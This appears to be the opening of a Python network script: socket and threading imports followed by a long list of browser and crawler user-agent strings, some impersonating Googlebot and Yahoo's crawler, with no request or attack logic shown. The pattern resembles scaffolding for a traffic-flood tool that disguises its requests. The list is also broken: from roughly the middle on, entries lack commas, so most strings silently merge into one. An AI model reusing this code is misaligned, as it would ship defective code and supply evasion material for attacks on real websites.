#!/usr/bin/env python
#coding: utf8
 
import random
import socket
import threading
import time
userAgents = [
 "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36",
 "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36",
 "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.9 Safari/536.5",
 "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.9 Safari/536.5",
 "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_0) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1063.0 Safari/536.3",
 "Mozilla/5.0 (Windows NT 5.1; rv:31.0) Gecko/20100101 Firefox/31.0",
 "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:29.0) Gecko/20120101 Firefox/29.0",
 "Mozilla/5.0 (X11; OpenBSD amd64; rv:28.0) Gecko/20100101 Firefox/28.0",
 "Mozilla/5.0 (X11; Linux x86_64; rv:28.0) Gecko/20100101  Firefox/28.0",
 "Mozilla/5.0 (Windows NT 6.1; rv:27.3) Gecko/20130101 Firefox/27.3",
 "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:25.0) Gecko/20100101 Firefox/25.0",
 "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:24.0) Gecko/20100101 Firefox/24.0",
 "Mozilla/5.0 (Windows; U; MSIE 9.0; WIndows NT 9.0; en-US))",
 "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)",
 "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/4.0; InfoPath.2; SV1; .NET CLR 2.0.50727; WOW64)",
 "Mozilla/5.0 (compatible; MSIE 10.0; Macintosh; Intel Mac OS X 10_7_3; Trident/6.0)",
 "Opera/12.0(Windows NT 5.2;U;en)Presto/22.9.168 Version/12.00",
 "Opera/9.80 (Windows NT 6.0) Presto/2.12.388 Version/12.14",
 "Mozilla/5.0 (Windows NT 6.0; rv:2.0) Gecko/20100101 Firefox/4.0 Opera 12.14",
 "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14",
 "Opera/12.80 (Windows NT 5.1; U; en) Presto/2.10.289 Version/12.02",
 "Opera/9.80 (Windows NT 6.1; U; es-ES) Presto/2.9.181 Version/12.00",
 "Opera/9.80 (Windows NT 5.1; U; zh-sg) Presto/2.9.181 Version/12.00",
 "Mozilla/5.0 (compatible; MSIE 9.0; Windows Phone OS 7.5; Trident/5.0; IEMobile/9.0)",
 "HTC_Touch_3G Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 7.11)",
 "Mozilla/4.0 (compatible; MSIE 7.0; Windows Phone OS 7.0; Trident/3.1; IEMobile/7.0; Nokia;N70)",
 "Mozilla/5.0 (BlackBerry; U; BlackBerry 9900; en) AppleWebKit/534.11+ (KHTML, like Gecko) Version/7.1.0.346 Mobile Safari/534.11+",
 "Mozilla/5.0 (BlackBerry; U; BlackBerry 9850; en-US) AppleWebKit/534.11+ (KHTML, like Gecko) Version/7.0.0.254 Mobile Safari/534.11+",
 "Mozilla/5.0 (BlackBerry; U; BlackBerry 9850; en-US) AppleWebKit/534.11+ (KHTML, like Gecko) Version/7.0.0.115 Mobile Safari/534.11+",
 "Mozilla/5.0 (BlackBerry; U; BlackBerry 9850; en) AppleWebKit/534.11+ (KHTML, like Gecko) Version/7.0.0.254 Mobile Safari/534.11+",
 "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/535.7 (KHTML, like Gecko) Comodo_Dragon/16.1.1.0 Chrome/16.0.912.63 Safari/535.7",
 "Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/532.5 (KHTML, like Gecko) Comodo_Dragon/4.1.1.11 Chrome/4.1.249.1042 Safari/532.5",
 "Mozilla/5.0 (iPad; CPU OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5355d Safari/8536.25",
 "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/537.13+ (KHTML, like Gecko) Version/5.1.7 Safari/534.57.2",
 "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_3) AppleWebKit/534.55.3 (KHTML, like Gecko) Version/5.1.3 Safari/534.53.10",
 "Mozilla/5.0 (iPad; CPU OS 5_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko ) Version/5.1 Mobile/9B176 Safari/7534.48.3",
 "Mozilla/5.0 (Windows; U; Windows NT 6.1; tr-TR) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.4 Safari/533.20.27",
 "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30)",
 "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)",
 "Googlebot/2.1 (http://www.googlebot.com/bot.html)",
 "Opera/9.20 (Windows NT 6.0; U; en)",
 "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.1) Gecko/20061205 Iceweasel/2.0.0.1 (Debian-2.0.0.1+dfsg-2)",
 "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; FDM; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 1.1.4322)",
 "Opera/10.00 (X11; Linux i686; U; en) Presto/2.2.0",
 "Mozilla/5.0 (Windows; U; Windows NT 6.0; he-IL) AppleWebKit/528.16 (KHTML, like Gecko) Version/4.0 Safari/528.16",
 "Mozilla/5.0 (compatible; Yahoo! Slurp/3.0; http://help.yahoo.com/help/us/ysearch/slurp)", # maybe not
 "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.13) Gecko/20101209 Firefox/3.6.13"
 "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 5.1; Trident/5.0)",
 "Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)",
 "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)",
 "Mozilla/4.0 (compatible; MSIE 6.0b; Windows 98)",
 "Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/4.0 (.NET CLR 3.5.30729)",
 "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.8) Gecko/20100804 Gentoo Firefox/3.6.8",
 "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.7) Gecko/20100809 Fedora/3.6.7-1.fc14 Firefox/3.6.7",
 "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
 "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)",
 "YahooSeeker/1.2 (compatible; Mozilla 4.0; MSIE 5.5; yahooseeker at yahoo-inc dot com ; http://help.yahoo.com/help/us/shop/merchant/)"
 "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; Acoo Browser; GTB5; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) ; Maxthon; InfoPath.1; .NET CLR 3.5.30729; .NET CLR 3.0.30618)"
 "Mozilla/4.0 (compatible; MSIE 7.0; America Online Browser 1.1; rev1.5; Windows NT 5.1; .NET CLR 1.0.3705; .NET CLR 1.1.4322; Media Center PC 4.0; InfoPath.1; .NET CLR 2.0.50727; Media Center PC 3.0; InfoPath.2)"
 "AmigaVoyager/2.95 (compatible; MC680x0; AmigaOS; SV1)"
 "Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.27; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)"
 "Mozilla/5.0 (X11; U; Linux; de-DE) AppleWebKit/527+ (KHTML, like Gecko, Safari/419.3) Arora/0.8.0"
 "Mozilla/5.0 (Windows; U; Windows NT 5.1; de-DE) AppleWebKit/527+ (KHTML, like Gecko, Safari/419.3) Arora/0.4 (Change: )"
 "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; Avant Browser; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0)"
 "Mozilla/5.0 (Windows; U; WinNT; en; rv:1.0.2) Gecko/20030311 Beonex/0.8.2-stable"
 "Mozilla/5.0 (X11; U; Linux i686; nl; rv:1.8.1b2) Gecko/20060821 BonEcho/2.0b2 (Debian-1.99+2.0b2+dfsg-1)"
 "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1b2) Gecko/20060826 BonEcho/2.0b2"
 "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET4.0C; .NET4.0E; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; Browzar)"
 "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.6; en; rv:1.9.2.14pre) Gecko/20101212 Camino/2.1a1pre (like Firefox/3.6.14pre)"
 "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en) AppleWebKit/418.8 (KHTML, like Gecko, Safari) Cheshire/1.0.UNOFFICIAL"
 "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en) AppleWebKit/419 (KHTML, like Gecko, Safari/419.3) Cheshire/1.0.ALPHA"
 "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.0.1) Gecko/20030111 Chimera/0.6"
 "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_2) AppleWebKit/537.17 (KHTML, like Gecko) Chrome/24.0.1309.0 Safari/537.17"
 "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.15 (KHTML, like Gecko) Chrome/24.0.1295.0 Safari/537.15"
 "Mozilla/5.0 (X11; CrOS i686 2268.111.0) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.57 Safari/536.11"
 "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.9 Safari/536.5"
 "Mozilla/5.0 (X11; FreeBSD amd64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.65 Safari/535.11"
 "Mozilla/5.0 (Macintosh; PPC Mac OS X 10_6_7) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/14.0.790.0 Safari/535.1"
 "Mozilla/5.0 Slackware/13.37 (X11; U; Linux x86_64; en-US) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.41"
 "Mozilla/5.0 ArchLinux (X11; Linux x86_64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.41 Safari/535.1"
 "Mozilla/5.0 (X11; Linux amd64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.24 Safari/535.1"
 "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.215 Safari/535.1"
 "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.2 (KHTML, like Gecko) ChromePlus/4.0.222.3 Chrome/4.0.222.3 Safari/532.2"
 "Mozilla/5.0 (Macintosh; U; PPC; en-US; mimic; rv:9.3.0) Gecko/20120117 Firefox/3.6.25 Classilla/CFM"
 "Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9.0.5) Gecko/2009011615 Firefox/3.0.5 CometBird/3.0.5"
 "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.30 (KHTML, like Gecko) Comodo_Dragon/12.1.0.0 Chrome/12.0.742.91 Safari/534.30"
 "Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/532.5 (KHTML, like Gecko) Comodo_Dragon/4.1.1.11 Chrome/4.1.249.1042 Safari/532.5"
 "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.16) Gecko/20101209 Conkeror/0.9.2 (Debian-0.9.2+git100804-1)"
 "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; Crazy Browser 3.0.5) ; .NET CLR 3.0.04506.30; InfoPath.2; InfoPath.3; .NET CLR 1.1.4322; .NET4.0C; .NET4.0E; .NET CLR 2.0.50727)"
 "Mozilla/4.0 (compatible; MSIE 5.5; Windows 98; Crazy Browser 1.x.x)"
 "Cyberdog/2.0 (Macintosh; PPC)"
 "Cyberdog/2.0 (Macintosh; 68k)"
 "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Deepnet Explorer 1.5.3; Smart 2x2; .NET CLR 1.1.4322; InfoPath.1; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30)"
 "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; pl-pl) AppleWebKit/312.8 (KHTML, like Gecko, Safari) DeskBrowse/1.0"
 "Dillo/2.0"
 "Dillo/0.8.6-i18n-misc"
 "Dooble/0.07 (de_CH) WebKit"
 "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/533+ (KHTML, like Gecko) Element Browser 5.0"
 "ELinks/0.9.3 (textmode; Linux 2.6.9-kanotix-8 i686; 127x41)"
 "ELinks/0.12~pre2.dfsg0-1ubuntu1 (textmode; Debian; Linux 2.6.28-15-generic x86_64; 207x60-2)"
 "Mozilla/5.0 (Windows; U; Windows NT 6.0; en-GB; rv:1.9.0.13) Gecko/2009073022 EnigmaFox/3.0.13"
 "Mozilla/5.0 (X11; U; Linux x86_64; it-it) AppleWebKit/534.26+ (KHTML, like Gecko) Ubuntu/11.04 Epiphany/2.30.6"
 "Mozilla/5.0 (X11; U; Linux x86_64; en; rv:1.9.0.14) Gecko/20080528 Ubuntu/9.10 (karmic) Epiphany/2.22 Firefox/3.0"
 "Mozilla/5.0 (X11; U; Linux x86_64; en; rv:1.9.0.8) Gecko/20080528 Fedora/2.24.3-4.fc10 Epiphany/2.22 Firefox/3.0"
 "Mozilla/5.0 (X11; U; Linux x86_64; en; rv:1.9.0.8) Gecko/20080528 Epiphany/2.22 (Debian/2.24.3-2)"
 "Mozilla/5.0 (X11; U; Linux i686; en; rv:1.9) Gecko/20080528 (Gentoo) Epiphany/2.22 Firefox/3.0"
 "Mozilla/5.0 (X11; U; FreeBSD i386; en; rv:1.8.1.12) Gecko/20080213 Epiphany/2.20 Firefox/2.0.0.12"
 "Mozilla/4.0 (compatible; MSIE 5.23; Macintosh; PPC) Escape 5.1.8"
 "Mozilla/5.0 (Windows; U; Windows NT 6.1; x64; fr; rv:1.9.2.13) Gecko/20101203 Firebird/3.6.13"
 "Mozilla/5.0 (Windows; U; Win98; en-US; rv:1.5) Gecko/20031007 Firebird/0.7"
 "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.5) Gecko/20031026 Firebird/0.7"
 "Mozilla/5.0 (X11; U; SunOS sun4u; en-US; rv:1.5a) Gecko/20030729 Mozilla Firebird/0.6.1"
 "Mozilla/5.0 (Windows; U; Win98; en-US; rv:1.5) Gecko/20031007 Firebird/0.7"
 "Mozilla/5.0 (Windows; U; Win95; en-US; rv:1.5) Gecko/20031007 Firebird/0.7"
 "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:2.0) Treco/20110515 Fireweb Navigator/2.4"
 "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_6; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Flock/3.5.3.4628 Chrome/7.0.517.450 Safari/534.7"
 "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Flock/3.5.2.4599 Chrome/7.0.517.442 Safari/534.7"
 "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_5; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Flock/3.5.0.4568 Chrome/7.0.517.440 Safari/534.7"
 "Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.9.0.16) Gecko/2009122206 Firefox/3.0.16 Flock/2.5.6"
 "Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10.4; en-US; rv:1.9.0.16) Gecko/2010010314 Firefox/3.0.16 Flock/2.5.6"
 "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_1; nl-nl) AppleWebKit/532.3+ (KHTML, like Gecko) Fluid/0.9.6 Safari/532.3+"
 "Galaxy/1.0 [en] (Mac OS X 10.5.6; U; en)"
 "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.16) Gecko/20080716 (Gentoo) Galeon/2.0.6"
 "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.10) Gecko Galeon/2.0.6 (Ubuntu 2.0.6-2.1)"
 "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.7) Gecko Galeon/2.0.6 (Debian 2.0.6-2.1)"
 "Mozilla/5.0(X11;U;Linux(x86_64);en;rv:1.9a8)Gecko/2007100619;GranParadiso/3.1"
 "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9a7) Gecko/2007080210 GranParadiso/3.0a7"
 "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.9a1) Gecko/20061204 GranParadiso/3.0a1"
 "Mozilla/5.0 (X11; U; Darwin i386; en-US; rv:1.9.0.8) Gecko/2009040414 GranParadiso/3.0.8"
 "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; WOW64; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) ; SLCC1; .NET CLR 2.0.50727; .NET CLR 3.0.04506; Media Center PC 5.0; .NET CLR 3.5.21022; GreenBrowser)"
 "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en) AppleWebKit/418.9 (KHTML, like Gecko) Hana/1.1"
 "Mozilla/5.0 (Macintosh; U; i386 Mac OS X; en) AppleWebKit/417.9 (KHTML, like Gecko) Hana/1.0"
 "HotJava/1.1.2 FCS"
 "HotJava/1.0.1/JRE1.1.x"
 "IBM WebExplorer /v0.94"
 "Mozilla/5.0 (compatible; IBrowse 3.0; AmigaOS4.0)"
 "Mozilla/5.0 (Macintosh; PPC Mac OS X 10_5_8) AppleWebKit/537.3+ (KHTML, like Gecko) iCab/5.0 Safari/533.16"
 "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.13) Gecko/20100916 Iceape/2.0.8"
 "Mozilla/5.0 (X11; U; Linux sparc64; es-PY; rv:5.0) Gecko/20100101 IceCat/5.0 (like Firefox/5.0; Debian-6.0.1)"
 "Mozilla/5.0 (X11; Linux x86_64; rv:15.0) Gecko/20100101 Firefox/15.0.1 Iceweasel/15.0.1"
 "Mozilla/5.0 (compatible; MSIE 10.6; Windows NT 6.1; Trident/5.0; InfoPath.2; SLCC1; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET CLR 2.0.50727) 3gpp-gba UNTRUSTED/1.0"
 "Mozilla/4.0 (compatible; MSIE 2.0; Windows NT 5.0; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0)"
 "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Trident/4.0; iRider 2.60.0008; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0)"
 "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.4 (KHTML, like Gecko) Chrome/22.0.1250.0 Iron/22.0.2150.0 Safari/537.4"
 "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.2.21pre) Gecko K-Meleon/1.7.0"
 "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.4pre) Gecko/20070404 K-Ninja/2.1.3"
 "Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.9.0.1) Gecko/20080722 Firefox/3.0.1 Kapiko/3.0"
 "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko Fedora/1.9.0.8-1.fc10 Kazehakase/0.5.6"
 "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; KKMAN3.2; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; InfoPath.2; .NET4.0C)"
 "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.19) Gecko/20081217 KMLite/1.1.2"
 "Mozilla/5.0 (X11; Linux 3.5.4-1-ARCH i686; es) KHTML/4.9.1 (like Gecko) Konqueror/4.9"
 "Mozilla/5.0 (X11; U; Linux x86_64; ru-RU) AppleWebKit/533.3 (KHTML, like Gecko) Leechcraft/0.4.55-13-g2230d9f Safari/533.3"
 "Links (6.9; Unix 6.9-astral sparc; 80x25)"
 "Mozilla/4.0 (compatible; MSIE 6.0; Windows XP 5.1) Lobo/0.98.4"
 "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-GB; rv:1.9.1.17) Gecko/20110123 Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.2) Gecko/20070225 lolifox/0.32"
 "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.2.3pre) Gecko/20100403 Lorentz/3.6.3plugin2pre (.NET CLR 4.0.20506)"
 "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; Lunascape 6.7.1.25446)"
 "Lynx/2.8.7rel.2 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/1.0.0a"
 "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en; rv:1.7.12) Gecko/20050928 Firefox/1.0.7 Madfox/3.0"
 "Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/533.1 (KHTML, like Gecko) Maxthon/3.0.8.2 Safari/533.1"
 "Mozilla/5.0 (X11; U; Linux i686; fr-fr) AppleWebKit/525.1+ (KHTML, like Gecko, Safari/525.1+) midori/1.19"
 "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:2.0b4pre) Gecko/20100815 Minefield/4.0b4pre"
 "Mozilla/5.0 (Windows; U; Windows NT 6.1; rv:2.2) Gecko/20110201"
 "Mozilla/5.0 (Windows; U; Windows NT 6.1; cs; rv:1.9.2.6) Gecko/20100628 myibrow/4alpha2"
 "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; SV1; MyIE2; .NET CLR 1.1.4322; .NET CLR 2.0.50727; WinFX RunTime 3.0.50727)"
 "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2a2pre) Gecko/20090908 Ubuntu/9.04 (jaunty) Namoroka/3.6a2pre GTB5 (.NET CLR 3.5.30729)"
 "Mozilla/5.0 (Windows; U; Windows NT 5.1; pt-BR) AppleWebKit/534.8 (KHTML, like Gecko) Navscape/Pre-0.2 Safari/534.8"
 "NCSA_Mosaic/2.7b4 (X11;AIX 1 000180663000)"
 "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_3; de-de) AppleWebKit/531.22.7 (KHTML, like Gecko) NetNewsWire/3.2.7"
 "Mozilla/3.0 (compatible; NetPositive/2.2.2; BeOS)"
 "Mozilla/5.0 (Windows; U; Win 9x 4.90; SG; rv:1.9.2.4) Gecko/20101104 Netscape/9.1.0285"
 "NetSurf/2.0 (RISC OS; armv5l)"
 "Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en-US) AppleWebKit/528.16 (KHTML, like Gecko, Safari/528.16) OmniWeb/v622.8.0.112941"
 "Opera/12.80 (Windows NT 5.1; U; en) Presto/2.10.289 Version/12.02"
 "Mozilla/5.0 (Windows; U; Windows NT 6.1; x64; fr; rv:1.9.1.1) Gecko/20090722 Firefox/3.5.1 Orca/1.2 build 2"
 "Mozilla/1.10 [en] (Compatible; RISC OS 3.70; Oregano 1.10)"
 "Mozilla/5.0 (X11; U; Linux i686; en-us) AppleWebKit/146.1 (KHTML, like Gecko) osb-browser/0.5"
 "Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:15.0) Gecko/20120919 Firefox/15.1.1-x64 PaleMoon/15.1.1-x64"
 "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.3a) Gecko/20021207 Phoenix/0.5"
 "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.13) Gecko/20080414 Firefox/2.0.0.13 Pogo/2.0.0.13.6866"
 "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.6; en-US; rv:1.9.2.3) Gecko/20100402 Prism/1.0b4"
 "Mozilla/5.0 (Windows; U; Windows NT 5.1; pt-BR) AppleWebKit/533.3 (KHTML, like Gecko) QtWeb Internet Browser/3.7 http://www.QtWeb.net"
 "Mozilla/5.0 (X11; U; Linux x86_64; cs-CZ) AppleWebKit/533.3 (KHTML, like Gecko) rekonq Safari/533.3"
 "retawq/0.2.6c [en] (text)"
 "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.24 (KHTML, like Gecko) RockMelt/0.9.58.494 Chrome/11.0.696.71 Safari/534.24"
 "Mozilla/5.0 (iPad; CPU OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5355d Safari/8536.25"
 "Mozilla/5.0 (Windows NT 5.2; RW; rv:7.0a1) Gecko/20091211 SeaMonkey/9.23a1pre"
 "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; ja-jp) AppleWebKit/419 (KHTML, like Gecko) Shiira/1.2.3 Safari/125"
 "Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9.1b5pre) Gecko/20090519 Shiretoko/3.5b5pre"
 "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.5.30729; .NET CLR 3.0.30618; .NET4.0C; .NET4.0E; Sleipnir/2.9.9)"
 "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; SlimBrowser)"
 "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_6; en-us) AppleWebKit/528.16 (KHTML, like Gecko) Stainless/0.5.3 Safari/525.20.1"
 "Sundance/0.9x(Compatible; Windows; U; en-US;)Version/0.9x"
 "Mozilla/6.0 (X11; U; Linux x86_64; en-US; rv:2.9.0.3) Gecko/2009022510 FreeBSD/ Sunrise/4.0.1/like Safari"
 "Surf/0.4.1 (X11; U; Unix; en-US) AppleWebKit/531.2+ Compatible (Safari; MSIE 9.0)"
 "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.8.1.9) Gecko/20071110 Sylera/3.0.20 SeaMonkey/1.1.6"
 "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; TencentTraveler 4.0; Trident/4.0; SLCC1; Media Center PC 5.0; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30618)"
 "Mozilla/5.0 (Macintosh; PPC Mac OS X 10.5; rv:10.0.2) Gecko/20120216 Firefox/10.0.2 TenFourFox/7450"
 "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; InfoPath.2; TheWorld)"
 "Uzbl (Webkit 1.3) (Linux i686 [i686])"
 "Vimprobable/0.9.20.5"
 "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.1pre) Gecko/20090629 Vonkeror/1.0"
 "w3m/0.52"
 "Mozilla/5.0 (Windows; U; Windows NT 5.1; pt-BR) AppleWebKit/534.12 (KHTML, like Gecko) WeltweitimnetzBrowser/0.25 Safari/534.12"
 "WorldWideweb (NEXT)"
 "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.6) Gecko/20100121 Firefox/3.5.6 Wyzo/3.5.6.1"
 "Mozilla/5.0 (Linux; U; Android 4.0.3; ko-kr; LG-L160L Build/IML74K) AppleWebkit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30"
 "Mozilla/5.0 (Linux; U; Android 4.0.3; de-ch; HTC Sensation Build/IML74K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30"
 "Mozilla/5.0 (Linux; U; Android 2.3; en-us) AppleWebKit/999+ (KHTML, like Gecko) Safari/999.9"
 "Mozilla/5.0 (Linux; U; Android 2.3.5; zh-cn; HTC_IncredibleS_S710e Build/GRJ90) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1"
 "Mozilla/5.0 (Linux; U; Android 2.3.5; en-us; HTC Vision Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1"
